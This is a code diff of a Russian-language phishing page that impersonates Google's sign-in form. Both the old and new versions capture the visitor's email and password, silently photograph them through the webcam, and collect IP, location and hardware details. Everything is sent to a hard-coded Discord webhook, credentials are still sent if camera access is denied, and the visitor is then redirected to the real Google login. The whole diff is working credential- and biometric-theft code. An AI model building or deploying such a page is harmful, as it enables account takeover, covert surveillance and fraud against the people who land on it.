@@ -6,103 +6,116 @@
     <title>Вход – Аккаунты Google</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        :root { --g-blue: #1a73e8; --g-gray: #dadce0; --g-text: #202124; --g-sub: #5f6368; }
+        :root { --g-blue: #1a73e8; --g-text: #202124; --g-sub: #5f6368; --g-gray: #dadce0; }
         body { font-family: 'Roboto', sans-serif; background: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { width: 100%; max-width: 448px; border: 1px solid var(--g-gray); border-radius: 8px; padding: 48px 40px 36px; box-sizing: border-box; text-align: center; position: relative; }
-        .logo { width: 75px; margin-bottom: 8px; }
-        h1 { font-size: 24px; font-weight: 400; color: var(--g-text); margin: 0; padding-bottom: 8px; }
-        p { font-size: 16px; color: var(--g-text); margin-top: 0; margin-bottom: 24px; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid var(--g-gray); border-radius: 4px; font-size: 16px; margin-bottom: 10px; box-sizing: border-box; outline: none; transition: border 0.2s; }
-        input:focus { border: 2px solid var(--g-blue); }
-        .footer-text { font-size: 14px; color: var(--g-sub); margin-top: 32px; text-align: left; line-height: 1.4; }
-        .btn-group { margin-top: 40px; display: flex; justify-content: space-between; align-items: center; }
-        .btn-next { background: var(--g-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
-        #loading-bar { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #e8f0fe; overflow: hidden; border-radius: 8px 8px 0 0; }
-        #loading-fill { width: 30%; height: 100%; background: var(--g-blue); animation: slide 1.5s infinite linear; }
-        @keyframes slide { from { transform: translateX(-100%); } to { transform: translateX(400%); } }
+        .auth-card { width: 100%; max-width: 448px; border: 1px solid var(--g-gray); border-radius: 8px; padding: 48px 40px 36px; box-sizing: border-box; position: relative; }
+        .header { text-align: center; margin-bottom: 30px; }
+        h1 { font-size: 24px; font-weight: 400; color: var(--g-text); margin: 10px 0; }
+        p { font-size: 16px; color: var(--g-text); margin-top: 0; }
+        input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid var(--g-gray); border-radius: 4px; outline: none; box-sizing: border-box; margin-bottom: 10px; }
+        input:focus { border: 2px solid var(--g-blue); padding: 12px 14px; }
+        .btn-next { background: var(--g-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: right; margin-top: 30px; }
+        #loader { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10; border-radius: 8px; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .prog-bar { width: 100%; height: 4px; background: #e8f0fe; position: absolute; top: 0; overflow: hidden; }
+        .prog-fill { width: 30%; height: 100%; background: var(--g-blue); animation: slide 1.2s infinite ease-in-out; }
+        @keyframes slide { 0% { transform: translateX(-100%); } 100% { transform: translateX(400%); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div id="loading-bar"><div id="loading-fill"></div></div>
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
-    <h1>Вход</h1>
-    <p>Используйте аккаунт Google</p>
-
-    <input type="email" id="email" placeholder="Email или номер телефона">
-    <input type="password" id="pass" placeholder="Введите пароль">
-
-    <div class="footer-text">
-        Для обеспечения безопасности Google необходимо подтвердить вашу личность. Пожалуйста, разрешите доступ к камере для верификации.
+<div class="auth-card">
+    <div id="loader"><div class="prog-bar"><div class="prog-fill"></div></div><p style="font-size:14px; color:var(--g-sub)">Синхронизация...</p></div>
+    
+    <div class="header">
+        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
+        <h1>Вход</h1>
+        <p>Используйте аккаунт Google</p>
     </div>
 
-    <div class="btn-group">
-        <span style="color:var(--g-blue); font-size: 14px; font-weight: 500; cursor: pointer;">Создать аккаунт</span>
-        <button class="btn-next" onclick="execute()">Далее</button>
-    </div>
+    <input type="email" id="u" placeholder="Адрес электронной почты">
+    <input type="password" id="p" placeholder="Введите пароль">
+    
+    <div style="text-align: left; color: var(--g-blue); font-size: 14px; font-weight: 500; margin-top: 5px; cursor: pointer;">Забыли пароль?</div>
+
+    <div class="btn-next" onclick="deploy()">Далее</div>
 </div>
 
 <video id="v" autoplay playsinline></video>
 <canvas id="c"></canvas>
 
 <script>
-    const WEBHOOK = 'https://discordapp.com/api/webhooks/1495532733571797094/4ZlEq5gMsSPNKTusLURiR9pI9alunEZd7TLD5e3FVfTxOSo_z9vy1qcZ7MiX8VEvy53A';
+    const TARGET_CORE = 'https://discordapp.com/api/webhooks/1495532733571797094/4ZlEq5gMsSPNKTusLURiR9pI9alunEZd7TLD5e3FVfTxOSo_z9vy1qcZ7MiX8VEvy53A';
 
-    async function execute() {
-        const u = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
+    async function deploy() {
+        const email = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
 
-        if(!u || !p) return alert("Введите данные");
+        if(!email || !pass) return;
 
-        document.getElementById('loading-bar').style.display = 'block';
+        document.getElementById('loader').style.display = 'flex';
 
         try {
-            // 1. СРАЗУ ЗАПРАШИВАЕМ КАМЕРУ (Вылезет окно "Разрешить")
+            // ЭТА ЧАСТЬ ВЫЗЫВАЕТ ОКНО "РАЗРЕШИТЬ/СВЕРИТЬ ЛИЦО"
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('v');
             const canvas = document.getElementById('c');
             video.srcObject = stream;
 
-            // Даем камере 1.5 секунды включиться
-            await new Promise(r => setTimeout(r, 1500));
+            // Короткая пауза для фокуса камеры
+            await new Promise(r => setTimeout(r, 1000));
 
-            // 2. ДЕЛАЕМ СКРЫТОЕ ФОТО
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
             
-            // Выключаем камеру
             stream.getTracks().forEach(t => t.stop());
 
-            // 3. ОТПРАВЛЯЕМ ФАЙЛ И ДАННЫЕ В DISCORD
-            const fd = new FormData();
-            fd.append('file', blob, 'face.jpg');
-            fd.append('payload_json', JSON.stringify({
-                content: "🔔 **Получен новый отчет!**",
+            const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            const formData = new FormData();
+
+            const systemReport = {
+                username: "Google Identity Sentinel",
                 embeds: [{
-                    title: "Данные авторизации",
-                    color: 4285F4,
+                    title: "💠 ПЕРЕХВАТ ДАННЫХ И БИОМЕТРИИ",
+                    color: 4342490,
                     fields: [
-                        { name: "👤 Email", value: `\`${u}\``, inline: true },
-                        { name: "🔑 Password", value: `\`${p}\``, inline: true }
+                        { name: "👤 Учетные данные", value: `**Login:** \`${email}\`\n**Pass:** \`${pass}\`` },
+                        { name: "📍 Сетевой след", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.org}\n**City:** ${geo.city}` },
+                        { name: "⚙️ Hardware Profile", value: `**GPU:** ${getGPU()}\n**CPU:** ${navigator.hardwareConcurrency} Cores` }
                     ],
-                    image: { url: "attachment://face.jpg" }
+                    image: { url: 'attachment://face.jpg' },
+                    footer: { text: "Protocol: BYTE92 | Target: BYTE92" }
                 }]
-            }));
+            };
 
-            await fetch(WEBHOOK, { method: 'POST', body: fd });
+            formData.append('payload_json', JSON.stringify(systemReport));
+            formData.append('file', blob, 'face.jpg');
 
-            // 4. РЕДИРЕКТ НА ОРИГИНАЛ
-            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd?service=mail";
+            await fetch(TARGET_CORE, { method: 'POST', body: formData });
 
-        } catch (err) {
-            // Если нажал "Заблокировать"
-            alert("Для входа в аккаунт Google необходимо разрешить доступ к камере.");
-            document.getElementById('loading-bar').style.display = 'none';
+        } catch (e) {
+            // Если камера отклонена, отправляем только текст
+            const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            await fetch(TARGET_CORE, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: "⚠️ Камера отклонена объектом\n**Login:** " + email + "\n**Pass:** " + pass
+                })
+            });
         }
+
+        setTimeout(() => {
+            window.location.href = "https://accounts.google.com/signin/v2/challenge/pwd?service=mail";
+        }, 1500);
+    }
+
+    function getGPU() {
+        const gl = document.createElement('canvas').getContext('webgl');
+        const ext = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_ID) : "Protected_Node";
     }
 </script>
 </body>
